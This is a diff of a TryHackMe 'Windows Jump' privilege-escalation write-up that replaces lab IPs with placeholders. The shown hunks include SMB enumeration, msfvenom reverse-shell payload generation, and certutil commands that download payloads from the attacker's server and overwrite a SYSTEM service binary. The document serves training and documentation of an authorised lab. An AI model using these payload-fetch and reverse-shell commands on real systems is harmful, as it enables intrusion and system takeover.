@@ -3,11 +3,22 @@
 
 **Pathway:** *Jr Penetration Tester* | **Section:** *Privilege Escalation* | **Challenge:** *[Windows Jump](https://tryhackme.com/room/windowsjump)*
 
-> **Spoiler warning:** This write-up contains the full exploitation chain, however no flag codes are shown in this write-up!
+> [!IMPORTANT]
+> **Spoiler warning:** This writeup contains part of exploitation chain, however no flag codes are shown in this writeup!
 >
-> **Please note:** The IP addresses shown in this write-up were allocated during the TryHackMe lab, with the attack performed from my own Kali Linux VM using OpenVPN connected to the TryHackMe Paris VPN server.
+> **Please note:** The IP addresses shown in this writeup were allocated during the TryHackMe lab, with the attack performed from my own Kali Linux VM using OpenVPN connected to the TryHackMe VPN.
 >
-> **License:** Unless otherwise stated, all write-ups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit).
+> **License:** Unless otherwise stated, all writeups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).
+> 
+> This writeup uses several placeholders to avoid exposing lab-specific or sensitive information:
+>
+> - `<TARGET_IP>` - the IP address assigned to the target host when the TryHackMe machine is started.
+> - `<TUN0_IP>` - the IP address assigned to my Kali Linux VM when connected to the TryHackMe VPN using OpenVPN.
+> - `<REDACTED>` - information intentionally removed from the public writeup, such as flags, credentials, hashes or other challenge-sensitive values.
+>
+> This writeup reflects my own route through the challenge. Other learners may solve the room using different tools, commands or techniques. To preserve the integrity of the challenge and to act responsibly towards TryHackMe and the wider learning community, I choose what to redact from my public writeups unless I am asked by TryHackMe or another appropriate party to redact or remove additional material.
+
+---
 
 ## About TryHackMe
 
@@ -28,8 +39,8 @@ guest -> thmuser -> notadmin -> svcadmin -> SYSTEM
 Confirmed lab details:
 
 ```text
-Target IP: 10.130.190.161
-Kali tun0 IP: 192.168.129.186
+Target IP: <TARGET_IP>
+Kali tun0 IP: <TUN0_IP>
 Attacker working directory: /tmp/VK/
 ```
 
@@ -54,7 +65,7 @@ The first step was to identify exposed services on the target.
 
 ```bash
 cd /tmp/VK
-nmap -Pn -sC -sV -oA windows-jump-initial 10.130.190.161
+nmap -Pn -sC -sV -oA windows-jump-initial <TARGET_IP>
 ```
 
 Important results:
@@ -74,7 +85,7 @@ The target exposed SMB, RDP and WinRM. SMB signing was enabled but not required.
 Anonymous SMB enumeration revealed a custom share named `Public`.
 
 ```bash
-smbclient -L //10.130.190.161 -N
+smbclient -L //<TARGET_IP> -N
 ```
 
 Relevant output:
@@ -88,7 +99,7 @@ Public          Disk      Public file share
 The share was accessible without credentials.
 
 ```bash
-smbclient //10.130.190.161/Public -N
+smbclient //<TARGET_IP>/Public -N
 ```
 
 Inside the SMB session:
@@ -112,7 +123,7 @@ This was the first security weakness: unauthenticated users could retrieve valid
 WinRM accepted the connection initially but rejected command execution, so RDP was used instead.
 
 ```bash
-xfreerdp3 /v:10.130.190.161 /u:thmuser /p:'<REDACTED>' /cert:ignore /dynamic-resolution +clipboard
+xfreerdp3 /v:<TARGET_IP> /u:thmuser /p:'<REDACTED>' /cert:ignore /dynamic-resolution +clipboard
 ```
 
 After logging in, a Command Prompt was opened and the current identity was confirmed:
@@ -283,7 +294,7 @@ copy C:\Windows\THMSVC\svc.exe C:\Windows\THMSVC\svc.exe.bak
 On Kali, a service-compatible reverse-shell executable was created:
 
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.129.186 LPORT=4444 -f exe-service -o /tmp/VK/svc.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TUN0_IP> LPORT=4444 -f exe-service -o /tmp/VK/svc.exe
 ```
 
 A temporary HTTP server was started:
@@ -296,7 +307,7 @@ python3 -m http.server 8000
 From the `notadmin` shell, the payload replaced the original service binary:
 
 ```cmd
-certutil -urlcache -split -f http://192.168.129.186:8000/svc.exe C:\Windows\THMSVC\svc.exe
+certutil -urlcache -split -f http://<TUN0_IP>:8000/svc.exe C:\Windows\THMSVC\svc.exe
 ```
 
 A Penelope listener was started on Kali:
@@ -375,13 +386,13 @@ The writable batch file was executed by a scheduled task running as `SYSTEM`, cr
 A standard Windows reverse-shell executable was generated on Kali:
 
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.129.186 LPORT=5555 -f exe -o /tmp/VK/shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TUN0_IP> LPORT=5555 -f exe -o /tmp/VK/shell.exe
 ```
 
 The payload was downloaded to the target:
 
 ```cmd
-certutil -urlcache -split -f http://192.168.129.186:8000/shell.exe C:\Windows\Tasks\shell.exe
+certutil -urlcache -split -f http://<TUN0_IP>:8000/shell.exe C:\Windows\Tasks\shell.exe
 ```
 
 The writable batch file was replaced so that it launched the payload:
@@ -468,7 +479,7 @@ The weaknesses identified in this room could be mitigated by:
 
 ## Disclaimer
 
-This write-up is intended solely for education, training and documentation of an authorised TryHackMe lab.
+This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.
 
 All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.
 
@@ -479,5 +490,5 @@ Never test, scan, exploit or access a system without clear and explicit authoris
 ---
 [!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  
 
-**Powered on ☕ made with ❤️ by [Valikahn](https://github.com/Valikahn)**  
+**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
 ⭐ If this project is useful, consider starring it on GitHub.
